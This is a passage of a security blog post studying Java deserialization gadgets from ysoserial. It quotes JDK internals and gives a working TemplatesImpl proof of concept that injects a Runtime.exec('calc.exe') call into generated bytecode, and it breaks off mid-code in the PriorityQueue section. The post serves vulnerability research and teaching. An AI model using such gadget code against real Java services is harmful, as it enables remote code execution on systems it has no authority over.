<!DOCTYPE html>
<html lang="en">
  <head><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="description" content="Java Deserialize Vulnerabilities, ysoserial study"/><meta name="keywords" content="CyberSecurity, Java code audit, penetration, 网络安全, 代码审计, 渗透测试, 安全研究" /><link rel="alternate" href="/atom.xml" title="Padishah's blog" type="application/atom+xml"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.2" />
<link rel="canonical" href="http://padishah.github.io/2023/10/24/Pentest/Java Deserialize Vulnerabilities ysoserial study/"/>

<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />
<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.2" />

<script>
  window.config = {"leancloud":{"app_id":null,"app_key":null,"server_url":null,"cdn":null},"toc":true,"fancybox":true,"pjax":"","latex":false};
</script>

    <title>Java Deserialize Vulnerabilities, ysoserial study - Padishah's blog</title>
  <meta name="generator" content="Hexo 6.3.0"></head>

  <body><div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/." class="logo">Padishah's blog</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>

<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list"><a href="/">
        <li class="mobile-menu-item">Home
          </li>
      </a><a href="/archives/">
        <li class="mobile-menu-item">Archives
          </li>
      </a><a href="/tags/">
        <li class="mobile-menu-item">Tags
          </li>
      </a><a href="/categories/">
        <li class="mobile-menu-item">Categories
          </li>
      </a><a href="/about/">
        <li class="mobile-menu-item">About
          </li>
      </a></ul>
</nav>
<div class="container" id="mobile-panel">
      <header id="header" class="header"><div class="logo-wrapper">
  <a href="/." class="logo">Padishah's blog</a>
</div>

<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
          <a class="menu-item-link" href="/">
            Home
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/archives/">
            Archives
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/tags/">
            Tags
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/categories/">
            Categories
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/about/">
            About
            </a>
        </li>
      </ul></nav>
</header>

      <main id="main" class="main">
        <div class="content-wrapper">
          <div id="content" class="content"><article class="post">
    <header class="post-header">
      <h1 class="post-title">Java Deserialize Vulnerabilities, ysoserial study
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2023-10-24
        </span></div>
    </header>

    <div class="post-toc" id="post-toc">
    <h2 class="post-toc-title">Contents</h2>
    <div class="post-toc-content">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Sinks"><span class="toc-text">Sinks</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#TemplatesImpl-exploit"><span class="toc-text">TemplatesImpl exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proof-of-Concept"><span class="toc-text">Proof of Concept</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JdbcRowSetImpl-exploit"><span class="toc-text">JdbcRowSetImpl exploit</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Kick-offs"><span class="toc-text">Kick-offs</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#AnnotationInvocationHandler-exploit"><span class="toc-text">AnnotationInvocationHandler exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PriorityQueue-exploit"><span class="toc-text">PriorityQueue exploit</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Chains"><span class="toc-text">Chains</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CommonCollections"><span class="toc-text">CommonCollections</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CommonCollections1"><span class="toc-text">CommonCollections1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Using-LazyMap"><span class="toc-text">Using LazyMap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Using-TransformedMap"><span class="toc-text">Using TransformedMap</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CommonCollections2"><span class="toc-text">CommonCollections2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CommonCollections3"><span class="toc-text">CommonCollections3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CommonCollections4"><span class="toc-text">CommonCollections4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CommonCollections5"><span class="toc-text">CommonCollections5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CommonCollections6-jdk1-8-1-7"><span class="toc-text">CommonCollections6 jdk1.8 1.7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CommonCollections7-jdk1-8-1-7"><span class="toc-text">CommonCollections7 jdk1.8 1.7</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Overview"><span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-chain"><span class="toc-text">Exploit chain</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hash-collision"><span class="toc-text">Hash collision</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Write-payload"><span class="toc-text">Write payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CommonsBeanutils"><span class="toc-text">CommonsBeanutils</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Using-TemplatesImpl-CB1-CB2"><span class="toc-text">Using TemplatesImpl (CB1 CB2)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Using-JdbcRowSetImpl-CB3"><span class="toc-text">Using JdbcRowSetImpl (CB3)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BeanShell"><span class="toc-text">BeanShell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BeanShell1-CVE-2016-2510"><span class="toc-text">BeanShell1  CVE-2016-2510</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Groovy"><span class="toc-text">Groovy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Spring"><span class="toc-text">Spring</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Spring1"><span class="toc-text">Spring1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#AnnotationInvocationHandler-special-functionality"><span class="toc-text">AnnotationInvocationHandler special functionality</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Kick-off-MethodInvokeTypeProvider"><span class="toc-text">Kick-off : MethodInvokeTypeProvider</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ObjectFactoryDelegatingInvocationHandler"><span class="toc-text">ObjectFactoryDelegatingInvocationHandler</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spring3"><span class="toc-text">Spring3</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tips"><span class="toc-text">Tips</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Insert-memory-shell-through-deserialization-vulnerability"><span class="toc-text">Insert memory shell through deserialization vulnerability</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fixes"><span class="toc-text">Fixes</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JDK-fixes"><span class="toc-text">JDK fixes</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Overview-1"><span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AnnotationInvocationHandler"><span class="toc-text">AnnotationInvocationHandler</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ysoserial"><span class="toc-text">ysoserial</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Problems"><span class="toc-text">Problems</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#How-to-test-Poc-Do-not-debug"><span class="toc-text">How to test Poc? Do not debug!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Journal"><span class="toc-text">Journal</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-text">Reference</span></a></li></ol></li></ol>
    </div>
  </div><div class="post-content"><h1 id="Sinks"><a href="#Sinks" class="headerlink" title="Sinks"></a>Sinks</h1><h2 id="TemplatesImpl-exploit"><a href="#TemplatesImpl-exploit" class="headerlink" title="TemplatesImpl exploit"></a>TemplatesImpl exploit</h2><blockquote>
<p>[!NOTE] Pre-requirements<br>Codes in this section are written with JDK7u21</p>
</blockquote>
<p><code>TemplatesImpl</code> provides a public approach to defining and instantiating classes from byte code.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;  </span><br><span class="line">    TransletClassLoader(ClassLoader parent) &#123;  </span><br><span class="line">        <span class="built_in">super</span>(parent);  </span><br><span class="line">    &#125;  </span><br><span class="line">   Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>Backtracking, in <code>defineTransletClasses</code> method calls <code>TransletClassLoader.defineClass()</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span>  </span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);  </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)  </span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;  </span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;  </span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader());  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;  </span><br><span class="line">        _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;  </span><br><span class="line">            _auxClasses = <span class="keyword">new</span> <span class="title class_">Hashtable</span>();  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;  </span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]);  </span><br><span class="line">            <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// Check if this is the main class  </span></span><br><span class="line">            <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;  </span><br><span class="line">                _transletIndex = i;  </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> &#123;  </span><br><span class="line">                _auxClasses.put(_class[i].getName(), _class[i]);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;  </span><br><span class="line">            ErrorMsg err= <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">catch</span> (ClassFormatError e) &#123;  </span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_CLASS_ERR, _name);  </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">catch</span> (LinkageError e) &#123;  </span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);  </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>There is a constraint that the superclass of the newly defined should be consistent with <code>AbstractTranslet</code>.</p>
<p>Backtracking, in <code>getTransletInstance</code> method, call <code>defineTransletClasses()</code> and instantiate the newly defined class:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span>  </span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();  </span><br><span class="line">		</span><br><span class="line">		<span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet)_class[_transletIndex].newInstance();  </span><br><span class="line">        translet.postInitialization();  </span><br><span class="line">        translet.setTemplates(<span class="built_in">this</span>);  </span><br><span class="line">        translet.setServicesMechnism(_useServicesMechanism);  </span><br><span class="line">        <span class="keyword">if</span> (_auxClasses != <span class="literal">null</span>) &#123;  </span><br><span class="line">            translet.setAuxiliaryClasses(_auxClasses);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> translet;  </span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>In <code>newTransformer</code> method calls <code>getTransletInstance()</code> and it’s public so we can find its reference for further exploitation:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span>  </span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException  </span><br><span class="line">&#123;  </span><br><span class="line">    TransformerImpl transformer;  </span><br><span class="line">  </span><br><span class="line">    transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,  </span><br><span class="line">        _indentNumber, _tfactory);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (_uriResolver != <span class="literal">null</span>) &#123;  </span><br><span class="line">        transformer.setURIResolver(_uriResolver);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;  </span><br><span class="line">        transformer.setSecureProcessing(<span class="literal">true</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> transformer;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">templatesImplCls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);  </span><br><span class="line"><span class="type">Class</span> <span class="variable">abstractTransletCls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);  </span><br><span class="line"><span class="type">Class</span> <span class="variable">factoryCls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();  </span><br><span class="line">classPool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(Gadgets.StubTransletPayload.class));  </span><br><span class="line">  </span><br><span class="line"><span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> classPool.get(Gadgets.StubTransletPayload.class.getName());  </span><br><span class="line"><span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;  </span><br><span class="line">clazz.makeClassInitializer().insertAfter(cmd);  </span><br><span class="line">  </span><br><span class="line"><span class="type">CtClass</span> <span class="variable">abstractTransletCtCls</span> <span class="operator">=</span> classPool.get(abstractTransletCls.getName());  </span><br><span class="line">clazz.setSuperclass(abstractTransletCtCls);  </span><br><span class="line"><span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;payload&quot;</span> + System.nanoTime();  </span><br><span class="line">clazz.setName(className);  </span><br><span class="line">  </span><br><span class="line"><span class="type">byte</span>[] bytecode = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> templatesImplCls.newInstance();  </span><br><span class="line">Reflections.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode, ClassFiles.classAsBytes(Gadgets.Foo.class)&#125;);  </span><br><span class="line">Reflections.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;xxx&quot;</span>);  </span><br><span class="line">Reflections.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, factoryCls.newInstance());  </span><br><span class="line">  </span><br><span class="line">((TemplatesImpl) templates).newTransformer();</span><br></pre></td></tr></table></figure>

<h2 id="JdbcRowSetImpl-exploit"><a href="#JdbcRowSetImpl-exploit" class="headerlink" title="JdbcRowSetImpl exploit"></a>JdbcRowSetImpl exploit</h2><blockquote>
<p>[!NOTE] pre-requirements<br>Reproduced on JDK1.8</p>
</blockquote>
<p>The method <code>connect()</code> of <code>JdbcRowSetImpl</code> can look up the JNDI URL stored in <code>databaseMetaData</code> property.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Connection <span class="title function_">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">	<span class="keyword">if</span>(conn != <span class="literal">null</span>) &#123;  </span><br><span class="line">    <span class="keyword">return</span> conn;  </span><br><span class="line">  </span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (getDataSourceName() != <span class="literal">null</span>) &#123;  </span><br><span class="line">	   ...</span><br><span class="line">		<span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line">		<span class="type">DataSource</span> <span class="variable">ds</span> <span class="operator">=</span> (DataSource)ctx.lookup  </span><br><span class="line">			(getDataSourceName());</span><br><span class="line">	...</span><br><span class="line">	&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Kick-offs"><a href="#Kick-offs" class="headerlink" title="Kick-offs"></a>Kick-offs</h1><h2 id="AnnotationInvocationHandler-exploit"><a href="#AnnotationInvocationHandler-exploit" class="headerlink" title="AnnotationInvocationHandler exploit"></a>AnnotationInvocationHandler exploit</h2><p>This class serves as a deserialization enter point.<br>In its deserialization process, <code>entrySet()</code> and <code>getValue()</code> method will be called on its <code>memberValues</code> member. The <code>entrySet()</code> can take effect associated with proxy([[Java Deserialize Vulnerabilities ysoserial study#Using TemplatesImpl (CB1 CB2)|example]]). The <code>getValue()</code> is widely used in CommonsCollections chain.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span>  </span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;  </span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line">    ...</span><br><span class="line">    Map&lt;String, Object&gt; streamVals = (Map&lt;String,Object&gt;)fields.get(<span class="string">&quot;memberValues&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">	...</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;  </span><br><span class="line">	    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();  </span><br><span class="line">	    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">	    Class&lt;?&gt; memberType = memberTypes.get(name);  </span><br><span class="line">	    <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists  </span></span><br><span class="line">	        value = memberValue.getValue();  </span><br><span class="line">	        <span class="keyword">if</span> (!(memberType.isInstance(value) ||  </span><br><span class="line">	              value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;  </span><br><span class="line">	            value = <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(  </span><br><span class="line">	                        objectToString(value))  </span><br><span class="line">	                .setMember(annotationType.members().get(name));  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>


<h2 id="PriorityQueue-exploit"><a href="#PriorityQueue-exploit" class="headerlink" title="PriorityQueue exploit"></a>PriorityQueue exploit</h2><p>The <code>PriorityQueue</code> class is a deserialization enter point.<br>Combine it with a certain comparator(e.g. [[Java Deserialize Vulnerabilities ysoserial study#CommonCollections2|TransformingComparator in CC2]], [[Java Deserialize Vulnerabilities ysoserial study#CommonsBeanutils|BeanComparator in CB1]]), the <code>compare()</code> method would be triggered in the deserialization process. </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span>  </span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    ...</span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)  </span><br><span class="line">        siftDown(i, (E) queue[i]);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;  </span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>)  </span><br><span class="line">        siftDownUsingComparator(k, x);  </span><br><span class="line">    <span class="keyword">else</span>        siftDownComparable(k, x);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;  </span><br><span class="line">    <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;  </span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;  